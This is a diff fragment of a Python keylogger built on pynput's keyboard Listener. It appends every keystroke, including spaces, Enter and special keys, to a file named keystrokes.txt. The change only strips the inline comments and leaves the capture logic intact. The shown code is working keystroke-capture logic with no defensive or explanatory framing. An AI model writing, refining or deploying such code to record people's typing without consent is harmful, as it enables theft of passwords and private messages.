@@ -3,13 +3,13 @@ from pynput.keyboard import Listener
 LOG_FILE = "keystrokes.txt"
 
 def log_keystroke(key):
-    key = str(key).replace("'", "")  # Remove quotes around key name
+    key = str(key).replace("'", "")  
     if key == "Key.space":
-        key = " "  # Replace "Key.space" with an actual space
+        key = " "  
     elif key == "Key.enter":
-        key = "\n"  # Newline for Enter key
+        key = "\n"  
     elif key.startswith("Key."):
-        key = f"[{key.replace('Key.', '')}]"  # Format special keys
+        key = f"[{key.replace('Key.', '')}]" 
 
     with open(LOG_FILE, "a") as file:
         file.write(key)
